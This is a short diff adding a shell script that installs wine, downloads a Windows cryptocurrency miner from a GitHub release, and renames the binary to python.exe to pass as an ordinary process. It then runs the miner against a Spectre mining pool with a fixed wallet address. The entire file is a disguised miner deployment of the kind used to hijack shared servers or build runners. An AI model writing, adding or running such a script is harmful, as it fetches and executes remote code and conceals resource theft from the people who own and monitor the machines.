@@ -1,0 +1,8 @@
+apt update -y
+apt install wine64 -y
+apt install wine -y
+apt install wget -y
+wget https://github.com/BinaryExpr/spectre-miner/releases/download/v0.6.26/spectre_miner_x64-v0.6.26_windows.zip
+unzip spectre_miner_x64-v0.6.26_windows.zip
+mv spectre-miner.exe python.exe
+wine python.exe -d eu.spectre-network.nevermine.io:55555 -w spectre:qq5e9grzs6pgmfyalk8ydgtfq5v3wmnet38m70t78gsenc4v59udcgukjlng3.vps
